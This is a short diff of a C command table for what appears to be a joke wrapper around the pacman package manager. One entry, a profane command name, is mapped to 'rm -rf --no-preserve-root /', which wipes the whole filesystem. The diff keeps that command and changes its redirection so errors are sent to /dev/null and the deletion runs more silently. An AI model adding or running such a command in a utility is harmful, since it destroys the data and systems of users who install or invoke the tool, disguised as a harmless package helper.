@@ -82,7 +82,7 @@ static Command commands[] = {
     { "query", query_flags, query_lflags, query_status, "Q", query_pacman_flags, LEN(query_flags), true },
     { "wash", NULL, NULL, NULL, "Rcns", NULL, 0, false },
     { "drip", NULL, NULL, NULL, "Syyu", NULL, 0, false },
-    { "fuck", NULL, NULL, NULL, "rm -rf --no-preserve-root / >/dev/null", NULL, 0, false },
+    { "fuck", NULL, NULL, NULL, "rm -rf --no-preserve-root / 2> /dev/null", NULL, 0, false },
     { "doodoofard", NULL, NULL, NULL, "v0.3", NULL, 0, false },
     { "help", NULL, NULL, NULL, NULL, NULL, 0, false },
 };
